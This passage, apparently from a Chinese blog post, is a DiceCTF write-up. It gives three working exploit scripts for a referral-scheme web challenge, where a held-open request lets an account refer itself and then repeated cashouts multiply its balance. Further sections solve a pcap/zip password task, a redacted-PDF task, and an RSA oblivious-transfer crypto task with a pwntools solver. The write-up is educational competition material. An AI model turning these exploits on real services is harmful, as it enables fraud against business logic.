coins&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>太好玩了，简直无懈可击，不是吗？（潘队：还是太安全了；放弃了，我需要马上玩游戏）</p><p>用户不使用推荐码进行注册，那么拉到的人头都是自己的；而使用推荐码注册，拉到的人头要跟上级对半分</p><p>emmm，感觉是可以通过<strong>自荐</strong>来获得1.5的<strong>指数爆炸</strong>效果，如果可以的话，应该发送63个数据包这样就可以实现。我测试过自荐，但很可惜，它不是在原有基础上再进行1.5指数倍增长，而是一部分一部分的转化，是加算，并且，通过发包发现，并不能实现1.5倍的转化，拿到多少是多少，意思就是没能实现自荐。。。</p><p>总不能我<code>yakit</code>多线程发包发到一千亿吧()</p><p>这题就像一个倒立的金字塔，越下面的人收获就越少……</p><p>赛后，要了<code>V&amp;N</code>一位师傅的<code>exp</code>，钻研之后，接着又去<code>discord</code>找<code>wp</code>，均进行了小改，以下脚本全部实现了自动化</p><p>首先，说一下<strong>实现自荐</strong>的思路：其实是因为<code>/new</code>路径下的<code>req.on(&#39;data&#39;) req.on(&#39;end&#39;)</code>，这里导致了可以实现<strong>分块传输</strong>，然后我们第一个块先<code>new</code>，获取到<code>token</code>(读完<code>请求body</code>就可以拿到<code>token</code>)，接着<code>Python发包</code>获取到<code>code</code>，第二个块就自荐注册，然后<strong>关闭进程</strong>，注意此过程<code>token</code>是一直要有的，最后要用一下推荐码才能有最开始的1.5，然后进行转换<strong>63次</strong>即可(1.5^63=1240亿)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRef</span>(<span class="params">code</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/new&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;attacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;refer&quot;</span>: code</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 建立HTTPS连接</span></span><br><span class="line">    host = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">    port = <span class="number">443</span>  <span class="comment"># HTTPS默认端口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建SSL上下文</span></span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建普通socket</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 包装为SSL socket</span></span><br><span class="line">    ssl_sock = context.wrap_socket(s, server_hostname=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到服务器</span></span><br><span class="line">    ssl_sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造分块请求头</span></span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">&quot;POST /new HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Host: &#123;host&#125;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Transfer-Encoding: chunked\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    ).<span class="built_in">format</span>(host=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送请求头</span></span><br><span class="line">    ssl_sock.send(request.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收服务器响应头（包含Set-Cookie）</span></span><br><span class="line">    response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:  <span class="comment"># 读取到空行表示响应头结束</span></span><br><span class="line">        response += ssl_sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    headers = response.split(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)[<span class="number">0</span>].decode()</span><br><span class="line">    cookie_header = [line <span class="keyword">for</span> line <span class="keyword">in</span> headers.split(</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span>) <span class="keyword">if</span> <span class="string">&#x27;set-cookie:&#x27;</span> <span class="keyword">in</span> line.lower()][<span class="number">0</span>]</span><br><span class="line">    token = cookie_header.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/code&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line">    code = re.findall(<span class="string">r&#x27;&lt;strong&gt;(.*?)&lt;/strong&gt;&#x27;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;获取到的code: <span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送第二个块：包含refer=code的数据</span></span><br><span class="line">    refer_data = <span class="string">f&quot;name=attacker&amp;refer=<span class="subst">&#123;code&#125;</span>&quot;</span>.encode()</span><br><span class="line">    chunk2_length = <span class="built_in">format</span>(<span class="built_in">len</span>(refer_data), <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 将长度转换为十六进制字符串</span></span><br><span class="line">    chunk2 = <span class="string">f&quot;<span class="subst">&#123;chunk2_length&#125;</span>\r\n<span class="subst">&#123;refer_data.decode()&#125;</span>\r\n&quot;</span></span><br><span class="line">    ssl_sock.send(chunk2.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送结束块</span></span><br><span class="line">    ssl_sock.send(<span class="string">b&quot;0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭连接</span></span><br><span class="line">    ssl_sock.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Exploit成功！Token已注入：<span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    addRef(code)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cashout</span>(<span class="params">token</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/cashout&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    token = exploit()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">        cashout(token)</span><br><span class="line">    res = requests.get(<span class="string">&quot;https://pyramid.dicec.tf/buy&quot;</span>,</span><br><span class="line">                       cookies=&#123;<span class="string">&quot;token&quot;</span>: token&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这里是<code>V&amp;N</code>的师傅的<code>exp</code>，我小改动了一下，主要是通过<code>socket</code>创建进程，注意到<strong>分块请求头</strong>和<strong>结束块</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">hostname = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;hostname&#125;</span>&#x27;</span></span><br><span class="line">context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((hostname, <span class="number">443</span>)) <span class="keyword">as</span> sock:</span><br><span class="line">    <span class="keyword">with</span> context.wrap_socket(sock, server_hostname=hostname) <span class="keyword">as</span> ssock:</span><br><span class="line">        ssock.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Connection: keep-alive\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Keep-Alive: timeout=25\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Content-Length: 51\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">        res = ssock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        token = re.search(<span class="string">r&quot;token=(\w+)&quot;</span>, res)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        resp = requests.get(url + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">        code = re.search(<span class="string">r&quot;strong&gt;(\w+)&lt;/strong&quot;</span>, resp.text)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Code: <span class="subst">&#123;code&#125;</span>&#x27;</span>)</span><br><span class="line">        ssock.send(<span class="string">f&#x27;name=pepos&amp;refer=<span class="subst">&#123;code&#125;</span>&#x27;</span>.encode())</span><br><span class="line">        requests.post(url + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;pepos&#x27;</span>, <span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Generated self-referential user&#x27;</span>)</span><br><span class="line">        ssock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(url + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">res = requests.get(url + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这里是<code>discord</code>上面一位师傅发的，也是通过<code>socket</code>创建进程，但这里并没有发现需要分块请求头，有点奇怪</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://pyramid.dicec.tf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST a request to /new but don&#x27;t send data yet</span></span><br><span class="line"><span class="comment"># We receive the cookie with our user token because of the server implementation</span></span><br><span class="line">r = remote(<span class="string">&#x27;pyramid.dicec.tf&#x27;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\nHost: pyramid.dicec.tf:443\r\nContent-Length: 100\r\n\r\n&#x27;</span>)</span><br><span class="line">token = r.recv().decode().split(<span class="string">&#x27;token=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;\r\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a new code for our not totally created account</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">code = res.text.split(<span class="string">&#x27;&lt;strong&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/strong&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Complete the initial registration with self-referral</span></span><br><span class="line">r.send(<span class="string">b&#x27;refer=&#x27;</span> + code.encode() + <span class="string">b&#x27;&amp;a=1&#x27;</span> * <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create another account so that our ref count is set to 1</span></span><br><span class="line">requests.post(URL + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit the /cashout exponential growth in case of self-referral</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(URL + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Buy the flag</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这也是<code>discord</code>上面的一位师傅发的，也是长见识了，<strong>pwntools</strong>也能<strong>实现分块传输</strong>，好思路</p><p>我试了一下，<code>Python</code>的<code>requests</code>发包可能是无法实现分块传输的，应该是需要借助进程才能实现</p><p>这样看，这道题还是挺有意思的</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="dicecap"><a href="#dicecap" class="headerlink" title="dicecap"></a>dicecap</h2><blockquote><p>As DiceGang haven’t won a CTF in 4 months, we’ve taken to more drastic measures to get to the top of the leaderboard - hacking our competitors! This pcap was gathered from a previous “information gathering” mission, can you find the flag?</p></blockquote><p>先导一下，得到一个压缩包<code>coolzip.zip</code>和二进制文件<code>main</code><br><img src="https://picx.zhimg.com/80/v2-7e1d5e967d495c54348dc24b5d8a0c8e_1440w.png" alt=""><br><code>ida</code>反编译</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">generate_password</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%d&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v1 - v1 % <span class="number">60</span>));</span><br><span class="line">  src = setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span class="number">5uLL</span>);</span><br><span class="line">  dest[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  v3 = getlogin();</span><br><span class="line">  <span class="built_in">strcat</span>(v6, s);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, dest);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The password is:%s\n&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交给<code>ChatGPT</code><br><img src="https://picx.zhimg.com/80/v2-04d7b1da0e83ea1bef2f76e28652534d_1440w.png" alt=""></p><p>后面两个简单，就找第一个的时间即可，<code>1743126493</code>，发现不对，再转化一下是，<code>1743126480</code><br><strong>password: 1743126480en_UShacker</strong><br><code>dice&#123;5k1d_y0ur_w@y_t0_v1ct0ry_t0d4y!!!&#125;</code></p><h2 id="bcu-binding"><a href="#bcu-binding" class="headerlink" title="bcu-binding"></a>bcu-binding</h2><blockquote><p>Comrades, we found this old manual in our basement. Can you see if there’s anything interesting about it?</p></blockquote><p>给了一个PDF<br><img src="https://pic1.zhimg.com/80/v2-0257e7475902470d41749e3ca81afe76_1440w.png" alt=""><br>记得<code>OSCTF</code>也有这样一题，也是涂黑了，但最后看文档属性就出了，这题并没有</p><p>尝试全选改变字体颜色看看有没有隐藏字符，发现异常<br><img src="https://pica.zhimg.com/80/v2-92abc36df6c3af108e5717f5862826ce_1440w.png" alt=""><br><code>FLAG: dice&#123;r3ad1ng_th4_d0cs_71ccd&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="vorpal-sword"><a href="#vorpal-sword" class="headerlink" title="vorpal-sword"></a>vorpal-sword</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#1–2_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">m0 = <span class="built_in">int</span>.from_bytes(msg0.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">m1 = <span class="built_in">int</span>.from_bytes(msg1.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c0 = (m0 + k0) % key.n</span><br><span class="line">c1 = (m1 + k1) % key.n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Vorpal Sword Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>奥，原来这就是<a href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/index.html">不经意传输</a></p><p>这里需要进行<strong>64次的输入</strong><br><code>n e x0 x1 c0 c1</code>是给出的，<code>v</code>是我们输入的<br>$k0\equiv (v-x0)^{d}mod(n)$<br>$k1\equiv(v-x1)^{d}mod(n)$<br>$c0\equiv m0+k0\ mod(n)$<br>$c1\equiv m1+k1\ mod(n)$<br>$m0,m1=(live,die)or(die,live)$</p><p>emm，还要注意的是句子后面都有<strong>句号</strong>，<code>VScode</code>的<code>copilot</code>给我<code>tap</code>的都没有，检查了半天<br><code>live = f&#39;you continue walking. turn to page &#123;page&#125;.&#39;</code><br><code>die = f&#39;you die of &#123;secrets.choice(DEATH_CAUSES)&#125;.&#39;</code></p><p>这里我们先假设<code>m0 = die</code>，因此<code>m1</code>是我们要知道的，同时<code>m0</code>是可以<strong>爆破</strong><code>DEATH_CAUSES</code>的</p><p>可以看到<code>k0,k1</code>的形式相似，此处精心构造<code>v=(x0+x1)/2</code><br>得到<br>$k1\equiv (-1)^{d}<em>k0(mod\ n)$<br>这里<code>d</code>必为奇数，因为<br>$e</em>d=k*\phi(n) +1$</p><p>所以有<br>$c0+c1\equiv m0+m1\ mod(n)$</p><p>然后就可以通过检验<code>m1</code>是否符合<code>live</code>前缀进行<code>page</code>的查找<br>这里交互的话，要注意<code>input</code>是需要<strong>字符串</strong>的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;dicec.tf&#x27;</span>, <span class="number">31001</span>)</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line">    <span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;drowning&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvline()</span><br><span class="line">    n = get_value()</span><br><span class="line">    e = get_value()</span><br><span class="line">    x0 = get_value()</span><br><span class="line">    x1 = get_value()</span><br><span class="line">    v = (x0 + x1) * inverse(<span class="number">2</span>, n) % n</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;v: &#x27;</span>, <span class="built_in">str</span>(v))</span><br><span class="line">    c0 = get_value()</span><br><span class="line">    c1 = get_value()</span><br><span class="line">    sum_m = (c0 + c1) % n</span><br><span class="line">    m1_prefix = <span class="string">b&#x27;you continue walking. turn to page &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">case</span> <span class="keyword">in</span> DEATH_CAUSES:</span><br><span class="line">        m0 = bytes_to_long(<span class="string">f&#x27;you die of <span class="subst">&#123;<span class="keyword">case</span>&#125;</span>.&#x27;</span>.encode())</span><br><span class="line">        m1 = long_to_bytes((sum_m - m0) % n)</span><br><span class="line">        <span class="keyword">if</span> m1.startswith(m1_prefix):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                page = <span class="built_in">int</span>(m1[<span class="built_in">len</span>(m1_prefix):-<span class="number">1</span>])</span><br><span class="line">                p.sendlineafter(<span class="string">b&#x27;turn to page: &#x27;</span>, <span class="built_in">str</span>(page))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;No valid page found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;gl3am1ng_g0ld_doubl00n&#125;</code></p><p>一开始看到这个题目是有点懵的，因为还要交互，后面去学了一手<strong>春哥</strong>的思路，tql</p><p>去搜索<strong>不经意传输</strong>，也发现一些有意思的题目……</p><h2 id="winxy-pistol"><a href="#winxy-pistol" class="headerlink" title="winxy-pistol"></a>winxy-pistol</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken 